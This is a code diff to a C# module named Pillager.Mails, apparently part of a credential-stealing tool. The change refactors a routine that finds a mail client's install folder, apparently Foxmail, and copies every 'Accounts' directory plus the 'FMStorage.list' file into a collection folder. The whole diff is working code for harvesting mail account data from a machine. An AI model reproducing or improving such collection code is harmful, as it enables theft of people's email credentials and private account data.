@@ -26,23 +26,13 @@ namespace Pillager.Mails
             try
             {
                 string installpath = GetInstallPath();
-                if (!Directory.Exists(installpath)||!Directory.Exists(Path.Combine(installpath, "Storage"))) return;
+                if (!Directory.Exists(installpath) || !Directory.Exists(Path.Combine(installpath, "Storage"))) return;
                 string savepath = Path.Combine(path, MailName);
                 Directory.CreateDirectory(savepath);
-                foreach (var directory in Directory.GetDirectories(Path.Combine(installpath, "Storage")))
+                DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(installpath, "Storage"));
+                foreach (var directory in directoryInfo.GetDirectories("Accounts", SearchOption.AllDirectories))
                 {
-                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
-                    foreach (var item in Directory.GetDirectories(Path.Combine(savepath, Path.GetFileName(directory))))
-                    {
-                        if (!item.EndsWith("Accounts"))
-                        {
-                            Directory.Delete(item,true);
-                        }
-                    }
-                    foreach (var item in Directory.GetFiles(Path.Combine(savepath, Path.GetFileName(directory))))
-                    {
-                        File.Delete(item);
-                    }
+                    Methods.CopyDirectory(directory.FullName, Path.Combine(savepath, Path.GetFileName(Path.GetDirectoryName(directory.FullName)) + "\\Accounts"), true);
                 }
                 if (File.Exists(Path.Combine(installpath, "FMStorage.list"))) File.Copy(Path.Combine(installpath, "FMStorage.list"), Path.Combine(savepath, "FMStorage.list"));
             }
